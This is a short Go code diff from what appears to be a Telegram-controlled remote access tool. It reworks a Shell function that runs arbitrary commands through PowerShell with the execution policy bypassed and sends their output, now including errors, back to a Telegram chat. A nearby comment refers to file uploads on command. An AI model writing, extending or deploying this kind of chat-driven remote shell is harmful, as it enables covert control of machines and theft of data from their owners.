@@ -36,15 +36,13 @@ func Reset() {
 }
 
 func Shell(command string) {
-	var out string
 	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
 	b, err := cmd.CombinedOutput()
-	if err == nil {
-		out = string(b)
+	out := string(b)
+	if err != nil {
+		out = err.Error() + "\n" + out
 	}
-	cfg := tgbotapi.NewMessage(util.ChatID, fmt.Sprintf("```\n%s\n```", out))
-	cfg.ParseMode = "Markdown"
-	api.Bot.Send(cfg)
+	api.SendFragmented(out, "\n", "```\n", "\n```")
 }
 
 //UploadFile handles /file commands by checking for and uploading a file.
